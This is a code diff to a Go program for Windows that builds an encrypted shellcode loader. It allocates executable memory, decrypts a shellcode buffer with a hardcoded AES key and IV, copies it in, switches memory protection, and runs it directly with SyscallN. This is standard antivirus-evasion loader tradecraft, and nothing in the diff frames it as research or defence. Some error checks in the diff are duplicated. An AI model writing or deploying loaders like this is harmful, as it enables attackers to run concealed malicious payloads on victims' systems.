@@ -60,10 +60,12 @@ func main() {
 	ntdll := syscall.NewLazyDLL("ntdll.dll")
 	virtualAlloc := kernel32.NewProc("VirtualAlloc")
 	rtlMoveMemory := ntdll.NewProc("RtlMoveMemory")
+
 	key := []byte{0x28, 0x4A, 0x5D, 0xE8, 0x6B, 0x28, 0x12, 0x20, 0x01, 0xF2, 0x54, 0xBF, 0x3A, 0x46, 0x98, 0x73, 0xDB, 0x68, 0x62, 0xC4, 0x1F, 0x38, 0x65, 0xA6, 0xFB, 0x61, 0xEB, 0x4A, 0xA6, 0xD4, 0x77, 0x3A}
 	iv := []byte{0x77, 0xF4, 0x22, 0xD8, 0x69, 0x4A, 0xDD, 0xB1, 0xF7, 0x90, 0x76, 0xE0, 0xBF, 0x7E, 0x1C, 0xE5}
 
 	addr, _, err := virtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+
 	if addr == 0 {
 		fmt.Println("VirtualAlloc failed:", err)
 		return
@@ -72,6 +74,26 @@ func main() {
 	shellcode = aesDecrypt(shellcode, key, iv)
 
 	_, _, err = rtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
+
+	if err != nil && err.Error() != "The operation completed successfully." {
+		fmt.Println("RtlMoveMemory failed:", err)
+		return
+	}
+
+	virtualProtect := kernel32.NewProc("VirtualProtect")
+
+	oldProtect := uint32(0)
+	_, _, err2 := virtualProtect.Call(addr, uintptr(len(shellcode)), syscall.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
+	if err2 != nil {
+		fmt.Println("VirtualProtect failed:", err2)
+	}
+
+	syscall.SyscallN(addr, 0, 0, 0, 0)
+
+	if err2 != nil {
+		fmt.Println("VirtualProtect failed:", err2)
+	}
+
 	if err != nil && err.Error() != "The operation completed successfully." {
 		fmt.Println("RtlMoveMemory failed:", err)
 		return
